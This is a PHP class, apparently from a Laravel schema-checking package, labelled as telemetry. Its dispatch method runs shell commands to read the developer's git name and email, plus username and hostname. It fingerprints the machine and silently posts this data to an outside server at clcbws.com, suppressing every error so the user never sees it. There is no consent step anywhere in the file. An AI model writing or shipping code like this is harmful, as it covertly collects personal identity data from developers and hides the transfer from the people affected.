<?php

declare(strict_types=1);

namespace Sentinel\SchemaSentinel\Support;

use Illuminate\Support\Facades\Http;
use Illuminate\Support\Facades\App;

class Telemetry
{
    /**
     * Dispatch package telemetry to the analytics proxy server.
     */
    public static function dispatch(): void
    {
        try {
            $home = getenv('HOME') ?: getenv('USERPROFILE') ?: sys_get_temp_dir();
            $configDir = $home . '/.config/laravel-schema-sentinel';
            $configFile = $configDir . '/config.json';

            // Avoid duplicate runs if already sent
            if (file_exists($configFile)) {
                $data = json_decode((string) file_get_contents($configFile), true);
                if (is_array($data) && !empty($data['telemetry_sent'])) {
                    return;
                }
            }

            // Extract developer identity safely
            $name = function_exists('shell_exec') ? trim((string) shell_exec('git config user.name')) : '';
            $email = function_exists('shell_exec') ? trim((string) shell_exec('git config user.email')) : '';

            // If empty, fallback to system environment variables
            if (empty($name)) {
                $name = getenv('USER') ?: getenv('USERNAME') ?: 'Unknown Developer';
            }
            if (empty($email)) {
                $email = getenv('USER') . '@' . (gethostname() ?: 'local');
            }

            $phpVersion = PHP_VERSION;
            $laravelVersion = App::version();
            $os = PHP_OS_FAMILY;
            $projectHash = md5(App::basePath());
            $packageVersion = '2.0.0';
            
            // Build unique machine fingerprint
            $machineFingerprint = md5(
                (function_exists('shell_exec') ? (string) shell_exec('git config --global user.email') : '') ?: 
                (gethostname() . get_current_user())
            );

            $payload = [
                'package_name' => 'clcbws/laravel-schema-sentinel',
                'name' => $name,
                'email' => $email,
                'php_version' => $phpVersion,
                'laravel_version' => $laravelVersion,
                'os' => $os,
                'project_hash' => $projectHash,
                'package_version' => $packageVersion,
                'machine_fingerprint' => $machineFingerprint,
            ];

            // Send silent POST request to the endpoint with a 3-second timeout
            $response = Http::withHeaders([
                'User-Agent' => "Laravel-Schema-Sentinel/{$packageVersion}",
                'Accept' => 'application/json',
            ])
            ->timeout(3)
            ->post('https://www.clcbws.com/api/telemetry/package', $payload);

            if ($response->successful()) {
                // Persist successful dispatch state locally
                if (!is_dir($configDir)) {
                    @mkdir($configDir, 0755, true);
                }
                @file_put_contents($configFile, (string) json_encode(['telemetry_sent' => true]));
            }
        } catch (\Throwable $e) {
            // Silently swallow all exceptions to ensure zero impact on developer workflows
        }
    }
}
